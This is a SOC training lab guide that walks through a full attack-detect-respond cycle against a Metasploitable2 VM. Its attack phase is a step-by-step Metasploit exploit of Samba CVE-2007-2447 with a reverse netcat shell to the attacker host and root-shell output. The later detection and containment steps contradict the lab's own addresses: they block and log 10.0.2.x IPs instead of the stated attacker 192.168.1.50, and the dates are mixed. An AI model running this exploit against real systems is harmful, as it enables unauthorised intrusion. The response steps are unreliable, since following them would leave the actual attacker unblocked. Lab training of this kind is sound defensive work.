# Lab 6 — Capstone: Full SOC Workflow Simulation
## Complete Step-by-Step Workflow

**Tools:** Metasploit, Wazuh, CrowdSec, TheHive, Google Docs  
**Objective:** Simulate complete attack → detect → triage → respond → escalate → report  
**MITRE:** T1210 (Exploitation of Remote Services)  
** WARNING:** Only perform on isolated lab VMs. Never test against unauthorized systems.

---

## Lab Environment Requirements

```
VM 1: Attacker Machine — Kali Linux (IP: 192.168.1.50)
VM 2: Vulnerable Target — Metasploitable2 (IP: 192.168.1.101)
VM 3: SOC Server — Ubuntu 22.04 with Wazuh + CrowdSec (IP: 192.168.1.10)

All VMs on same isolated NAT network: 192.168.1.0/24
Internet: DISABLED on target and attacker during lab
```

### Setup Metasploitable2 VM
```
1. Download: https://sourceforge.net/projects/metasploitable/
2. Import OVF into VirtualBox/VMware
3. Default credentials: msfadmin / msfadmin
4. Assign static IP: 192.168.1.101
5. Confirm Samba is running:
   ps aux | grep smbd
   # Expected: /usr/sbin/smbd -D
```

---

## Phase 1: Attack Simulation

### Step 1 — Reconnaissance (Kali Linux)
```bash
# Verify network connectivity
ping 192.168.1.101

# Discover open ports on Metasploitable2
nmap -sV -sC -p- 192.168.1.101

# Key services expected:
# 21/tcp  open  ftp     vsftpd 2.3.4
# 22/tcp  open  ssh     OpenSSH 4.7p1
# 139/tcp open  netbios-ssn Samba smbd 3.X
# 445/tcp open  microsoft-ds Samba smbd 3.X
# 3632/tcp open distccd
```

### Step 2 — Identify Samba Vulnerability
```bash
# Check Samba version specifically
nmap -p 445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 192.168.1.101
nmap -p 445 --script smb-security-mode 192.168.1.101

# Confirm usermap_script vulnerability (Samba 3.0.20-3.0.25rc3)
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.101; run; exit"
```

### Step 3 — Launch Metasploit Console
```bash
# Start Metasploit
msfconsole

# You'll see the msf6 > prompt
# Optional: suppress banner
msfconsole -q
```

### Step 4 — Load and Configure Samba Exploit
```bash
# Inside msfconsole:
msf6 > use exploit/multi/samba/usermap_script

# Verify module loaded
msf6 exploit(multi/samba/usermap_script) > info

# Set target
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.1.101
msf6 exploit(multi/samba/usermap_script) > set RPORT 445

# Set payload
msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat

# Set attacker (listener) IP
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.1.50
msf6 exploit(multi/samba/usermap_script) > set LPORT 4444

# Verify options
msf6 exploit(multi/samba/usermap_script) > show options
```

### Step 5 — Execute the Exploit
```bash
msf6 exploit(multi/samba/usermap_script) > exploit

# Expected output:
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.101:41234) at 2025-08-18 14:00:00 +0000

# You should get a shell:
# id
# uid=0(root) gid=0(root)

# Document: take screenshot NOW
# Type: whoami, id, hostname
whoami
id
hostname
ifconfig
```

### Step 6 — Record Attack Details for Documentation
```
Timestamp: 2025-08-18 14:00:00 UTC
Source IP: 192.168.1.50 (Kali attacker)
Target IP: 192.168.1.101 (Metasploitable2)
Exploit: exploit/multi/samba/usermap_script
CVE: CVE-2007-2447
Shell: cmd/unix/reverse_netcat
LPORT: 4444
Result: Root shell obtained
MITRE Technique: T1210 — Exploitation of Remote Services
```

### Step 7 — Exit Shell (for lab purposes)
```bash
# Inside the shell:
exit

# Back in msfconsole:
msf6 > sessions -l    # list sessions
msf6 > sessions -k 1  # kill session 1
msf6 > exit
```

---

## Phase 2: Detection and Triage

### Step 1 — Install Wazuh Agent on Metasploitable2
```bash
# On Metasploitable2 (SSH as msfadmin):
ssh msfadmin@192.168.1.101

# Install Wazuh agent
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb
sudo WAZUH_MANAGER='192.168.1.10' dpkg -i wazuh-agent_4.7.0-1_amd64.deb
sudo systemctl enable --now wazuh-agent
```

### Step 2 — Create Custom Wazuh Rule for Samba Exploit
```bash
# On Wazuh Server
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Add:
```xml
<group name="samba,exploit,t1210">
  <rule id="100020" level="15">
    <decoded_as>syslog</decoded_as>
    <match>usermap_script|smbd.*cmd.*exec|/bin/sh.*445</match>
    <description>T1210: Samba usermap_script exploit attempt detected</description>
    <mitre>
      <id>T1210</id>
    </mitre>
  </rule>

  <rule id="100021" level="13">
    <program_name>smbd</program_name>
    <match>Authentication failure|user does not exist</match>
    <description>Samba authentication failure — possible reconnaissance</description>
  </rule>

  <rule id="100022" level="15">
    <if_group>syslog</if_group>
    <srcip>192.168.1.50</srcip>
    <description>Alert: Traffic from known attacker IP 192.168.1.50</description>
  </rule>
</group>
```

```bash
sudo systemctl restart wazuh-manager
# Test rule syntax:
sudo /var/ossec/bin/ossec-logtest
```

### Step 3 — Check Wazuh Dashboard for Alerts
```
Wazuh Dashboard → Security Events
→ Search: rule.id: 100020 OR rule.id: 100022
→ Or search by source IP: 192.168.1.50
→ Or search MITRE: T1210

Expected alerts:
- Samba exploit detection (level 15)
- Reverse connection attempt (level 13+)
- Unusual process spawning (sh from smbd)
```

### Step 4 — Document Detection Table
```
| Timestamp            | Source IP      | Dest IP        | Alert Description         | Rule ID | MITRE  | Severity |
|----------------------|----------------|----------------|---------------------------|---------|--------|----------|
| 2026-03-26 14:00:00  | 10.0.2.20      | 192.168.1.101  | Samba exploit detected    | 100020  | T1210  | Critical |
| 2026-03-26 14:00:02  | 10.0.2.25    | 192.168.1.50   | Reverse shell outbound    | 100022  | T1210  | Critical |
| 2026-03-26 14:00:05  | 10.0.2.28     | 192.168.1.101  | Root access obtained      | 100021  | T1210  | Critical |

Save as: Lab6_DetectionTable.csv
```

---

## Phase 3: Response and Containment

### Step 1 — Isolate Metasploitable2 VM
```bash
# Option A: VirtualBox/VMware — disconnect network adapter
# In hypervisor GUI: Settings → Network → Adapter 1 → Cable Connected: UNCHECK

# Option B: On Metasploitable2 directly (if still accessible)
ssh msfadmin@192.168.1.101
sudo iptables -I INPUT -j DROP
sudo iptables -I OUTPUT -j DROP
sudo iptables -I INPUT -s 192.168.1.10 -j ACCEPT  # Allow Wazuh server only

# Verify isolation:
ping 10.0.2.20    # Should timeout
ping 10.0.2.25  # Should still work (Wazuh)
```

### Step 2 — Block Attacker IP with CrowdSec

```bash
# On Wazuh/SOC Server (10.0.2.20)
# Install CrowdSec
curl -s https://packagecloud.io/install/repositories/crowdsec/crowdsec/script.deb.sh | sudo bash
sudo apt-get install crowdsec -y
sudo apt install crowdsec-firewall-bouncer-iptables -y

# Configure firewall bouncer
sudo nano /etc/crowdsec/bouncers/crowdsec-firewall-bouncer.yaml
# Ensure: mode: iptables

sudo systemctl enable --now crowdsec
sudo systemctl enable --now crowdsec-firewall-bouncer

# Manually block the attacker IP
sudo cscli decisions add --ip 10.0.2.25  --duration 24h --reason "Samba exploit — CVE-2007-2447 — Lab6"

# Verify block
sudo cscli decisions list

# Expected:
# +--------+----------+---------+--------+---------+
# | Source |    IP    | Reason  |  Action| Duration|
# +--------+----------+---------+--------+---------+
# | cscli  |10.0.2.25 | Samba..| ban   | 24h     |
```

### Step 3 — Verify Block with Ping Test
```bash
# From attacker Kali (10.0.2.20):
ping 10.0.2.20
# Expected: 100% packet loss (blocked by iptables)

# From SOC server:
sudo iptables -L -n | grep 10.0.2.20
# Should show DROP rule
```

---

## Phase 4: Escalation to Tier 2

### Step 1 — Create TheHive Capstone Case
```
TheHive - New Case
Title: CRITICAL — Remote Code Execution via Samba Exploit (CVE-2007-2447)
Severity: Critical (4 stars)
TLP: Red 
Tags: CVE-2007-2447, T1210, RCE, root-shell, Metasploitable2, capstone

Description (100 words):
At 2026-03-26 14:00 UTC, Wazuh detected exploitation of CVE-2007-2447 
(Samba usermap_script) against Metasploitable2 (192.168.1.101) from 
10.0.2.25. Attacker obtained root shell via Metasploit module 
exploit/multi/samba/usermap_script using reverse_netcat payload on port 4444. 
Wazuh Rule 100020 (MITRE T1210) triggered at level 15. Target system has 
been network-isolated. Attacker IP blocked via CrowdSec/iptables. Memory 
acquisition recommended before further analysis. Scope of compromise unknown — 
lateral movement to other 10.0.2.20/24 hosts possible. Immediate Tier 2 
forensic investigation required. Case contains all IOCs and timeline.
```

### Step 2 — Add Observables
```
+ Add Observable:
  Type: IP    Value: 10.0.2.25               Tags: attacker-ip
  Type: IP    Value: 10.0.2.26                 Tags: victim-server
  Type: other  Value: CVE-2007-2447  Tags: cve, samba
  Type: hash  Value: [Metasploit module MD5] Tags: exploit-tool
  Type: port  Value: 4444            Tags: reverse-shell-port
  Type: port  Value: 445             Tags: smb, target-port
```

### Step 3 — Assign to Tier 2
```
Case → Assignee: tier2@cyart.soc
Case → Add comment with escalation note
```

---

## Phase 5: Incident Report (SANS Format)

```markdown
# INCIDENT REPORT
# CYART SOC — Confidential

**Case Number:** SOC-2026-0818-001  
**Date:** 2026-03-26  
**Severity:** Critical  
**Status:** Contained  
**Analyst:** [Name], Tier 1 SOC  

---

## 1. EXECUTIVE SUMMARY

On 2026-03-26 at 14:00 UTC, an attacker exploited a known vulnerability 
(CVE-2007-2447) in Samba version 3.x on Metasploitable2 (192.168.1.101). 
The attacker obtained root-level command execution using a publicly available 
Metasploit module. The affected system has been isolated from the network and 
the attacker IP has been blocked. No lateral movement was detected at time of 
reporting. Tier 2 investigation is ongoing.

## 2. INCIDENT TIMELINE

| Time (UTC)   | Event                                               |
|--------------|-----------------------------------------------------|
| 13:55:00     | Attacker begins port scan (nmap) of 10.0.2.20       |
| 13:58:00     | Samba version fingerprinting observed               |
| 14:00:00     | Metasploit exploit launched (usermap_script)        |
| 14:00:02     | Root shell established — reverse netcat on port 4444 |
| 14:00:05     | Wazuh Rule 100020 triggered — level 15 Critical     |
| 14:03:00     | Tier 1 analyst acknowledged alert                   |
| 14:10:00     | Metasploitable2 isolated from network               |
| 14:12:00     | Attacker IP blocked via CrowdSec                    |
| 14:30:00     | Case created in TheHive (#8)                        |
| 14:45:00     | Escalated to Tier 2                                 |

## 3. TECHNICAL ANALYSIS

**Vulnerability:** CVE-2007-2447 — Samba "username map script" command injection  
**CVSS Score:** 10.0 (Critical)  
**Affected Software:** Samba 3.0.20–3.0.25rc3  
**Attack Vector:** Network — Port 445/SMB  
**MITRE ATT&CK:** T1210 — Exploitation of Remote Services  

The attacker used Metasploit module `exploit/multi/samba/usermap_script` to 
inject OS commands via the Samba username field. When Samba processes the 
specially crafted username, the embedded shell metacharacters cause the 
`/bin/sh` binary to be executed with root privileges, establishing a reverse 
shell connection to the attacker's machine.

## 4. IMPACT ASSESSMENT

- **Confidentiality:** HIGH — Root access means all data accessible
- **Integrity:** HIGH — Files could have been modified
- **Availability:** MEDIUM — System still operational until isolation
- **Scope:** Single host (192.168.1.101) — no confirmed lateral movement

## 5. CONTAINMENT ACTIONS

 Metasploitable2 network-isolated (disconnected from segment)  
 Attacker IP 192.168.1.50 blocked via CrowdSec iptables rule  
 Wazuh alert acknowledged and documented  
 Case created and assigned in TheHive  
 Memory acquisition initiated for forensic analysis  

## 6. RECOMMENDATIONS

1. Immediately patch Samba to version 3.6.x or higher on all systems
2. Implement network segmentation — restrict port 445 to authorized hosts only
3. Deploy intrusion prevention rules for SMB exploitation patterns
4. Audit all systems for unpatched Samba installations using vulnerability scanner
5. Review firewall rules to block unnecessary SMB exposure
6. Implement privileged access management — services should not run as root
7. Enable and monitor Samba audit logging across all deployments

## 7. APPENDICES

A. Wazuh Alert Export — Lab6_DetectionTable.csv  
B. Network Capture — pcap file (if available)  
C. Memory Dump Hash — ServerY_memory_20250818.sha256  
D. CrowdSec Block Confirmation — screenshot  
E. TheHive Case #8 — export  
```

---

## Phase 6: Management Briefing (100 words, Non-Technical)

```
On 26-03-2026, our security monitoring system detected an unauthorized 
intrusion into one of our lab servers. An attacker exploited an outdated 
software vulnerability to gain administrative control of the server. Our SOC 
team detected the intrusion within 3 minutes, immediately disconnected the 
affected server from the network, and blocked the attacker's access. No 
customer data was exposed and no other systems were compromised. Our team is 
performing a full investigation to ensure the attack is fully contained. 
Recommended action: Approve emergency patching of all servers running the 
identified vulnerable software within 48 hours.
```

---

## Deliverables Checklist
- [ ] Metasploitable2 VM set up and running
- [ ] Nmap reconnaissance completed and documented
- [ ] Samba exploit executed successfully in Metasploit
- [ ] Shell obtained — screenshot taken
- [ ] Wazuh custom rules created for T1210
- [ ] Wazuh alerts fired — detection table filled
- [ ] Metasploitable2 isolated from network
- [ ] Attacker IP blocked with CrowdSec
- [ ] Ping test confirmed block is active
- [ ] TheHive case created with all observables
- [ ] Case escalated to Tier 2
- [ ] 200-word incident report written (SANS format)
- [ ] 100-word management briefing written
- [ ] All screenshots taken and named correctly
